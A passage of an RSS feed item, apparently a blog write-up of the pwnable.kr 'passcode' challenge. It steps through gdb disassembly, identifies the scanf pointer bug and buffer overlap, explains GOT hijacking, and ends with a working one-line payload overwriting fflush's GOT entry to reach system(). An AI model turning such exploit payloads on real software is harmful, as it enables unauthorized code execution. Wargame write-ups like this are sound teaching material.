-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As we know, &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; will read the data from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; according to the format parameter and will store it in a &lt;strong&gt;location&lt;/strong&gt; (where location is just an address of the variable) passed by the other parameters. So both &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode2&lt;/code&gt; variables should be dereferenced in order to properly save the variables just like this.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;So after that we know that solving this challenge by the classic mean of entering hardcoded password from source won’t work. Let’s fire up &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; to study this binary, looking for potential flaws.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;passcode@ubuntu:~$ gdb ./passcode 
-GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
-Copyright (C) 2016 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
-and &quot;show warranty&quot; for details.
-This GDB was configured as &quot;x86_64-linux-gnu&quot;.
-Type &quot;show configuration&quot; for configuration details.
-For bug reporting instructions, please see:
-&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
-Find the GDB manual and other documentation resources online at:
-&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
-For help, type &quot;help&quot;.
-Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
-Reading symbols from ./passcode...(no debugging symbols found)...done.
-(gdb) set disassembly-flavor intel
-(gdb) disas main
-Dump of assembler code for function main:
-   0x08048665 &amp;lt;+0&amp;gt;:	push   ebp
-   0x08048666 &amp;lt;+1&amp;gt;:	mov    ebp,esp
-   0x08048668 &amp;lt;+3&amp;gt;:	and    esp,0xfffffff0
-   0x0804866b &amp;lt;+6&amp;gt;:	sub    esp,0x10
-   0x0804866e &amp;lt;+9&amp;gt;:	mov    DWORD PTR [esp],0x80487f0
-   0x08048675 &amp;lt;+16&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
-   0x0804867a &amp;lt;+21&amp;gt;:	call   0x8048609 &amp;lt;welcome&amp;gt;
-   0x0804867f &amp;lt;+26&amp;gt;:	call   0x8048564 &amp;lt;login&amp;gt;
-   0x08048684 &amp;lt;+31&amp;gt;:	mov    DWORD PTR [esp],0x8048818
-   0x0804868b &amp;lt;+38&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
-   0x08048690 &amp;lt;+43&amp;gt;:	mov    eax,0x0
-   0x08048695 &amp;lt;+48&amp;gt;:	leave  
-   0x08048696 &amp;lt;+49&amp;gt;:	ret    
-End of assembler dump.
-(gdb) disas login
-Dump of assembler code for function login:
-   0x08048564 &amp;lt;+0&amp;gt;:	push   ebp
-   0x08048565 &amp;lt;+1&amp;gt;:	mov    ebp,esp
-   0x08048567 &amp;lt;+3&amp;gt;:	sub    esp,0x28
-   0x0804856a &amp;lt;+6&amp;gt;:	mov    eax,0x8048770
-   0x0804856f &amp;lt;+11&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x08048572 &amp;lt;+14&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
-   0x08048577 &amp;lt;+19&amp;gt;:	mov    eax,0x8048783
-   0x0804857c &amp;lt;+24&amp;gt;:	mov    edx,DWORD PTR [ebp-0x10]
-   0x0804857f &amp;lt;+27&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
-   0x08048583 &amp;lt;+31&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x08048586 &amp;lt;+34&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;
-   0x0804858b &amp;lt;+39&amp;gt;:	mov    eax,ds:0x804a02c
-   0x08048590 &amp;lt;+44&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x08048593 &amp;lt;+47&amp;gt;:	call   0x8048430 &amp;lt;fflush@plt&amp;gt;
-   0x08048598 &amp;lt;+52&amp;gt;:	mov    eax,0x8048786
-   0x0804859d &amp;lt;+57&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x080485a0 &amp;lt;+60&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
-   0x080485a5 &amp;lt;+65&amp;gt;:	mov    eax,0x8048783
-   0x080485aa &amp;lt;+70&amp;gt;:	mov    edx,DWORD PTR [ebp-0xc]
-   0x080485ad &amp;lt;+73&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
-   0x080485b1 &amp;lt;+77&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x080485b4 &amp;lt;+80&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;
-   0x080485b9 &amp;lt;+85&amp;gt;:	mov    DWORD PTR [esp],0x8048799
-   0x080485c0 &amp;lt;+92&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
-   0x080485c5 &amp;lt;+97&amp;gt;:	cmp    DWORD PTR [ebp-0x10],0x528e6
-   0x080485cc &amp;lt;+104&amp;gt;:	jne    0x80485f1 &amp;lt;login+141&amp;gt;
-   0x080485ce &amp;lt;+106&amp;gt;:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
-   0x080485d5 &amp;lt;+113&amp;gt;:	jne    0x80485f1 &amp;lt;login+141&amp;gt;
-   0x080485d7 &amp;lt;+115&amp;gt;:	mov    DWORD PTR [esp],0x80487a5
-   0x080485de &amp;lt;+122&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
-   0x080485e3 &amp;lt;+127&amp;gt;:	mov    DWORD PTR [esp],0x80487af
-   0x080485ea &amp;lt;+134&amp;gt;:	call   0x8048460 &amp;lt;system@plt&amp;gt;
-   0x080485ef &amp;lt;+139&amp;gt;:	leave  
-   0x080485f0 &amp;lt;+140&amp;gt;:	ret    
-   0x080485f1 &amp;lt;+141&amp;gt;:	mov    DWORD PTR [esp],0x80487bd
-   0x080485f8 &amp;lt;+148&amp;gt;:	call   0x8048450 &amp;lt;puts@plt&amp;gt;
-   0x080485fd &amp;lt;+153&amp;gt;:	mov    DWORD PTR [esp],0x0
-   0x08048604 &amp;lt;+160&amp;gt;:	call   0x8048480 &amp;lt;exit@plt&amp;gt;
-End of assembler dump.
-(gdb) disas welcome
-Dump of assembler code for function welcome:
-   0x08048609 &amp;lt;+0&amp;gt;:	push   ebp
-   0x0804860a &amp;lt;+1&amp;gt;:	mov    ebp,esp
-   0x0804860c &amp;lt;+3&amp;gt;:	sub    esp,0x88
-   0x08048612 &amp;lt;+9&amp;gt;:	mov    eax,gs:0x14
-   0x08048618 &amp;lt;+15&amp;gt;:	mov    DWORD PTR [ebp-0xc],eax
-   0x0804861b &amp;lt;+18&amp;gt;:	xor    eax,eax
-   0x0804861d &amp;lt;+20&amp;gt;:	mov    eax,0x80487cb
-   0x08048622 &amp;lt;+25&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x08048625 &amp;lt;+28&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
-   0x0804862a &amp;lt;+33&amp;gt;:	mov    eax,0x80487dd
-
-   0x0804863e &amp;lt;+53&amp;gt;:	mov    eax,0x80487e3
-   0x08048643 &amp;lt;+58&amp;gt;:	lea    edx,[ebp-0x70]
-   0x08048646 &amp;lt;+61&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
-   0x0804864a &amp;lt;+65&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x0804864d &amp;lt;+68&amp;gt;:	call   0x8048420 &amp;lt;printf@plt&amp;gt;
-   0x08048652 &amp;lt;+73&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
-   0x08048655 &amp;lt;+76&amp;gt;:	xor    eax,DWORD PTR gs:0x14
-   0x0804865c &amp;lt;+83&amp;gt;:	je     0x8048663 &amp;lt;welcome+90&amp;gt;
----Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---
-   0x0804865e &amp;lt;+85&amp;gt;:	call   0x8048440 &amp;lt;__stack_chk_fail@plt&amp;gt;
-   0x08048663 &amp;lt;+90&amp;gt;:	leave  
-   0x08048664 &amp;lt;+91&amp;gt;:	ret    
-End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This is the disassembly of two functions that we’re going to mostly work on. We can analyze the &lt;code class=&quot;highlighter-rouge&quot;&gt;welcome()&lt;/code&gt; function that will read username and pass it to the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable. From assembly we can view the part of the code that will read the name.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x0804862f &amp;lt;+38&amp;gt;:	lea    edx,[ebp-0x70]
-   0x08048632 &amp;lt;+41&amp;gt;:	mov    DWORD PTR [esp+0x4],edx
-   0x08048636 &amp;lt;+45&amp;gt;:	mov    DWORD PTR [esp],eax
-   0x08048639 &amp;lt;+48&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Here we can see instruction &lt;code class=&quot;highlighter-rouge&quot;&gt;lea&lt;/code&gt; performed on &lt;code class=&quot;highlighter-rouge&quot;&gt;edx&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x70&lt;/code&gt;. We can translate it just as load the effective address (calculate it) and store in the &lt;code class=&quot;highlighter-rouge&quot;&gt;edx&lt;/code&gt; register. From that information, we know that variable &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x70&lt;/code&gt; is the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; variable.&lt;/p&gt;
-
-&lt;p&gt;In the next function - &lt;code class=&quot;highlighter-rouge&quot;&gt;welcome()&lt;/code&gt;, we can see the part that will make use of &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;   0x0804857c &amp;lt;+24&amp;gt;:	mov    edx,DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ebp-0x10]
-   0x0804857f &amp;lt;+27&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp+0x4],edx
-   0x08048583 &amp;lt;+31&amp;gt;:	mov    DWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;esp],eax
-   0x08048586 &amp;lt;+34&amp;gt;:	call   0x80484a0 &amp;lt;__isoc99_scanf@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But here, other than in previous example we don’t calculate the address of the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt;, we just use it’s value with &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx,DWORD PTR [ebp-0x10]&lt;/code&gt;. All the same with &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode2&lt;/code&gt; - &lt;code class=&quot;highlighter-rouge&quot;&gt;mov edx,DWORD PTR [ebp-0xc]&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;So what can we do with this information? After looking for a while, I noticed that the difference between &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable is smaller than &lt;code class=&quot;highlighter-rouge&quot;&gt;100&lt;/code&gt;, which is the size of the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;welcome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;That way we can overwrite value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; by entering 96 characters in name, and using last 4 characters as the part for &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt;. In order to demonstrate it, we can set a breakpoint just before the first &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;login()&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x08048583
-Breakpoint 1 at 0x8048583&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we can run the binary, with input consisting of 100 ‘A’ letters.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
-Starting program: /home/passcode/passcode 
-Toddler&lt;span class=&quot;s1&quot;&gt;'s Secure Login System 1.0 beta.
-enter you name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
-(gdb) x/s $ebp-0x10
-0xff910158:	&quot;AAAA&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;See? These 4 ‘A’ letters are inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable. But as we can’t modify the second variable, we still can’t solve this challenge. Let’s look at the source code once again.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode1 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;fflush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;// ha! mommy told me that 32bit is vulnerable to bruteforcing :)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;enter passcode2 : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passcode2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;While looking at this part I’ve noticed a possiblity. As we can control what’s inside the the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable, and the scanf() function that is supposed to write the value into the location at address presentend by the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; variable, we are able to write some value into the any address in the binary. If you don’t understand, let’s break it down into simple steps.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;We are able to enter the value into the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; by filling the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer.&lt;/li&gt;
-  &lt;li&gt;Function &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; will place the value from &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; into the location of memory represented by the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt;.&lt;/li&gt;
-  &lt;li&gt;Profit.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;But now we have to find a suitable target for this technique. Here comes this very interesting exploit that will overwrite the GOT table of this binary. What is GOT?&lt;/p&gt;
-
-&lt;p&gt;Global Offset Table is a place in which binary stores the addresses of functions, that are unknown at compilation time and is updated at runtime by dynamic linker. Basically, functions like &lt;code class=&quot;highlighter-rouge&quot;&gt;printf()&lt;/code&gt; have their addresses there because they are not static. That’s why dynamic linker will at runtime look for these addresses of these functions, and put them in GOT. If function is used once again, we only have to get the address from the GOT, no need to run dynamic linker twice.&lt;/p&gt;
-
-&lt;p&gt;For more information I encourage you to read these papers, as this is only droplet in the ocean of knowledge:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&quot;&gt;https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf&quot;&gt;www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Now we can write down our full plan for attack. Firstly, we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function as our victim that we can overwrite. Function that will be overwriting will be &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/cat flag&quot;);&lt;/code&gt;. So we have to find addresses of both of them. Then we will pass to the &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode1&lt;/code&gt; address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function, by simply fullfilling the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer. After that using the first &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; we will be ready to overwrite the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function with &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;. After that all should be ready.&lt;/p&gt;
-
-&lt;p&gt;But firstly, let’s find the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt;, what we can do with &lt;code class=&quot;highlighter-rouge&quot;&gt;objudmp -R&lt;/code&gt; command.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;-R
---dynamic-reloc
-Print the dynamic relocation entries of the file.  This is only
-meaningful for dynamic objects, such as certain types of shared
-libraries.  As for -r, if used with -d or -D, the relocations are
-printed interspersed with the disassembly.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; passcode
-passcode:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE 
-08049ff0 R_386_GLOB_DAT    __gmon_start__
-0804a02c R_386_COPY        stdin@@GLIBC_2.0
-0804a000 R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@GLIBC_2.0
-0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
-0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
-0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
-0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
-0804a014 R_386_JUMP_SLOT   __gmon_start__
-0804a018 R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;@GLIBC_2.0
-0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
-0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;See? Here we have it &lt;code class=&quot;highlighter-rouge&quot;&gt;0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Now from the previous disassembly, we cavn view the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;   0x080485e3 &amp;lt;+127&amp;gt;:	mov    DWORD PTR [esp],0x80487af
-   0x080485ea &amp;lt;+134&amp;gt;:	call   0x8048460 &amp;lt;system@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And we’re ready to craft the payload - 96 ‘A’ letters, address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;fflush()&lt;/code&gt; function and to satisfy the &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf()&lt;/code&gt; - address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;passcode@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A' * 96 + '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;a0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;08' + '134514147')&quot;&lt;/span&gt; | ./passcode
-Toddler&lt;span class=&quot;s1&quot;&gt;'s Secure Login System 1.0 beta.
-enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
-Sorry mom.. I got confused about scanf usage :(
-enter passcode1 : Now I can safely trust you that you have credential :)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-</description>
-        <pubDate>Fri, 29 Jun 2018 02:00:00 +0200</pubDate>
-        <link>http://localhost:4000/pwnable.kr-passcode/</link>
-        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-passcode/</guid>
       </item>
     
   </channel>
